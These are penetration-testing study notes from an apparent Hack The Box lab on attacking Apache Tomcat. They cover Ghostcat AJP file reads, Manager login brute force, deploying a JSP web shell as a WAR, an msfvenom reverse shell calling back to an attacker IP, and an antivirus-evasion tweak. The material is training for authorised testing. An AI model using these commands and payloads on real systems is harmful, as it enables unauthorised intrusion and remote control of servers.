# Attacking Tomcat (CPTS Notes)

## Method 3: CVE-2020-1938 — "Ghostcat"

**Type:** Unauthenticated **Local File Inclusion (LFI)** via AJP protocol misconfiguration
**Affects:** All versions before **9.0.31, 8.5.51, 7.0.100**
**Protocol:** AJP (Apache JServ Protocol) — binary protocol for proxying requests to app servers, typically on **port 8009**

### Detection
```
junior-security-analyst@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```
```
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

### Exploitation
- **Limitation:** Can only read files **within the webapps folder** — cannot reach files like `/etc/passwd`
```
junior-security-analyst@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```
- Can expose sensitive data in `WEB-INF` (e.g., deployment descriptors, potentially credentials in some installs)

---

## Overview
Tomcat Manager compromise is the primary path to RCE. Internal/external Tomcat is worth deep attention — if `/manager` or `/host-manager` is accessible with weak creds, it often leads directly to shell access (frequently as a privileged user).

## Method 1: Tomcat Manager Login Brute Force

### Using Metasploit (`auxiliary/scanner/http/tomcat_mgr_login`)
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

**Key options:**
| Option | Purpose |
|---|---|
| `STOP_ON_SUCCESS` | Stops once valid creds found — avoids unnecessary noise |
| `USER_FILE` / `PASS_FILE` | Default: `tomcat_mgr_default_users.txt` / `tomcat_mgr_default_pass.txt` |
| `USERPASS_FILE` | Combined user:pass pairs |
| `TARGETURI` | Defaults to `/manager/html` |
| `THREADS` | Max 1 per host |

**Result example:** `[+] Login Successful: tomcat:admin`

### Debugging via Proxy
Route Metasploit through Burp/ZAP to inspect requests:
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
```
- Tomcat uses **HTTP Basic Auth** — credentials are base64-encoded in the `Authorization` header
```
junior-security-analyst@htb[/htb]$ echo YWRtaW46dmFncmFudA== | base64 -d
admin:vagrant
```

### Manual/Scripted Alternative (Python)
```
junior-security-analyst@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u <users_file> -p <passwords_file>
```
Result: `Username: tomcat / Password: admin`

> **Philosophy note:** No tool is inherently "better" — Metasploit, Burp Intruder, or custom scripts are all valid as long as you understand what they do and can explain their impact to the client.

## Method 2: WAR File Upload via Manager GUI

Accessible at `/manager/html` by default — requires `manager-gui` role.

### Steps
1. Download a JSP web shell (e.g., `cmd.jsp` — simple command-execution shell with a form field)
2. Package it into a WAR file:
```
junior-security-analyst@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
junior-security-analyst@htb[/htb]$ zip -r backup.war cmd.jsp
```
3. In Manager GUI: **Browse** → select `.war` → **Deploy**
   - App appears in the list (e.g., `/backup`)
4. Access the **specific JSP file**, not just the app root (app root alone → 404):
```
http://web01.inlanefreight.local:8180/backup/cmd.jsp
```
5. Execute commands:
```
junior-security-analyst@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

### Cleanup
- Click **Undeploy** next to the app in Manager GUI (removes WAR + extracted directory)
- **Note the upload path for the report** — e.g., `/opt/tomcat/apache-tomcat-10.0.10/webapps`
- Verify via web shell `ls` that `backup.war`, `backup/` dir, `cmd.jsp`, and `META-INF` were created

### Alternative: msfvenom Reverse Shell WAR
```
junior-security-analyst@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
- Deploy via Manager GUI → Tomcat auto-extracts
- Start listener, trigger via browsing to `/backup`:
```
junior-security-analyst@htb[/htb]$ nc -lnvp 4443
```
→ Reverse shell as `tomcat` user

> **Automation option:** `multi/http/tomcat_mgr_upload` Metasploit module automates the whole upload-and-shell process.

### AV Evasion Note
- Standard `cmd.jsp` flagged by 2/58 AV vendors on VirusTotal
- A trivial string change (`"Uploaded:` → `"uPlOaDeD:`) dropped detection to **0/58** — illustrates how fragile signature-based detection can be

### Web Shell OPSEC (applies across all CMS/app attacks)
- Use a **randomized filename** (MD5 hash style)
- **Restrict access by source IP**
- **Password protect** where possible
- Prevents a third-party "drive-by" attacker from finding and abusing your shell during the engagement

---

## Key Takeaways
- **Ghostcat (CVE-2020-1938)** is a solid unauthenticated starting point for LFI if version is vulnerable and AJP (8009) is exposed
- Always test `/manager` and `/host-manager` for **weak/default creds** next — extremely common finding
- Successful Manager login → **WAR upload with JSP shell** → RCE (often running as a **privileged user** — SYSTEM or root)
- Document file paths, hashes, and upload locations for reporting; always **Undeploy/clean up** web shells afterward
